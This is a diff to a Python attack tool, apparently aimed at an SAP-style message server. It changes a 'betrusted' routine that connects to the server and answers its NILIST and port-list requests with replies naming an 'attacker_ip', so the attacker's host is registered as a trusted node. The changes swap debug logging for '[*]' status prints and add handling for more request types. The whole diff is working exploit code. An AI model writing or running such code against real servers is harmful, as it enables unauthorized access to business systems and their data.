@@ -477,10 +477,11 @@ def _wait_and_reply_nilist(sock: socket.socket, fromname: str, key: bytes,
 
         # Log every received packet so we can see what the MS is sending
         opc = ms_parse_opcode(pkt)
-        logger.debug(
-            f"MS→us: flag={flag:#04x} iflag={iflag:#04x} "
+        print(
+            f"[*] Wait: MS pkt flag={flag:#04x} iflag={iflag:#04x} "
             f"msgtype={hdr.get('msgtype', 0):#04x} "
-            f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)}"
+            f"opcode={opc.get('opcode', -1):#04x} len={len(pkt)} "
+            f"body={pkt[_HEADER_LEN:_HEADER_LEN+16].hex()}"
         )
 
         if flag == FLAG_ADMIN:
@@ -787,16 +788,22 @@ def betrusted(host: str, port: int, attacker_ip: str,
                     break
                 if len(pkt) >= _HEADER_LEN:
                     hdr2 = ms_parse_header(pkt)
-                    if hdr2 and hdr2.get("flag") == FLAG_ADMIN:
-                        adm = pkt[_HEADER_LEN:]
-                        # Determine opcode: with or without ADM eyecatcher
-                        if adm[:12] == _ADM_EYE and len(adm) >= _ADM_HDR_LEN + 1:
-                            opcode = adm[_ADM_HDR_LEN]
-                        elif len(adm) >= 1:
-                            opcode = adm[0]
-                        else:
-                            continue
-                        try:
+                    if not hdr2:
+                        continue
+                    flag2  = hdr2.get("flag", -1)
+                    iflag2 = hdr2.get("iflag", -1)
+                    print(f"[*] Hold: MS pkt flag={flag2:#04x} iflag={iflag2:#04x} "
+                          f"len={len(pkt)} body={pkt[_HEADER_LEN:_HEADER_LEN+16].hex()}")
+                    try:
+                        if flag2 == FLAG_ADMIN:
+                            adm = pkt[_HEADER_LEN:]
+                            # Determine opcode: with or without ADM eyecatcher
+                            if adm[:12] == _ADM_EYE and len(adm) >= _ADM_HDR_LEN + 1:
+                                opcode = adm[_ADM_HDR_LEN]
+                            elif len(adm) >= 1:
+                                opcode = adm[0]
+                            else:
+                                continue
                             if opcode == ADM_NILIST:
                                 print("[*] Hold: ADM NILIST request — replying")
                                 ni_send(sock, build_nilist_reply(
@@ -808,9 +815,22 @@ def betrusted(host: str, port: int, attacker_ip: str,
                                 ni_send(sock, build_nilist_port_reply(
                                     our_name, key, nilist_port=0))
                             else:
-                                logger.debug(f"Hold: ADM opcode {opcode:#04x} ignored")
-                        except (ConnectionError, OSError):
-                            break
+                                print(f"[*] Hold: ADM opcode {opcode:#04x} (ignored)")
+                        elif flag2 in (FLAG_REQUEST, FLAG_ONE_WAY):
+                            opc2 = ms_parse_opcode(pkt)
+                            opc_val = opc2.get("opcode", -1)
+                            if opc_val == OPCODE_NILIST:
+                                print("[*] Hold: OPCODE NILIST (REQUEST) — replying")
+                                ni_send(sock, build_nilist_reply(
+                                    our_name, key, attacker_ip, kernel_new))
+                                result["nilist_response"] = True
+                                result["nilist_sent"] = True
+                            elif opc_val == ADM_GET_NILIST_PORT:
+                                print("[*] Hold: AD_GET_NILIST_PORT (REQUEST) — replying port=0")
+                                ni_send(sock, build_nilist_port_reply(
+                                    our_name, key, nilist_port=0))
+                    except (ConnectionError, OSError):
+                        break
             print(f"[*] Stop signal received — disconnecting from MS")
         else:
             # Standalone / CLI mode: keep connection open for nilist_wait
